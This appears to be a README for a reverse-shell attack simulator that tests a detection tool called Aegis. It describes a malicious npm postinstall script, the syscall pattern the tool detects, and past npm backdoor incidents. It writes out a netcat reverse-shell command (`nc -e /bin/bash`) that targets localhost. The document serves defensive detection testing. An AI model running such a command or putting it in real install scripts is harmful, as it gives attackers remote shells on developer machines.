# REVERSE_SHELL — Reverse Shell Attack Simulator

## What it simulates

A malicious npm `postinstall` script that spawns a bash subprocess and
attempts to establish a reverse shell connection using netcat (`nc`).

## Attack behavior

1. Spawns `/bin/bash` as a child process from Node.js
2. Inside bash, runs: `nc -e /bin/bash localhost 4444`
3. The listener at port 4444 won't exist — we only need the syscall pattern

## Syscall pattern (what Aegis detects)

- `execve` syscall where the binary is `bash` AND the parent process is `node`
- `execve` syscall for `nc` with `-e` flag (shell redirect)
- `connect` syscall to `localhost:4444`

## Real-world references

- **coa/rc backdoor (2021)**: Popular npm packages `coa` and `rc` were
  compromised with malicious preinstall scripts that spawned reverse shells
  on infected developer machines.
- **colors.js / faker.js (2022)**: While not a reverse shell, the maintainer
  injected infinite loop code, demonstrating how lifecycle scripts can
  execute arbitrary code.

## Running

```bash
docker build -t aegis-reverse-shell .
docker run --rm aegis-reverse-shell
```
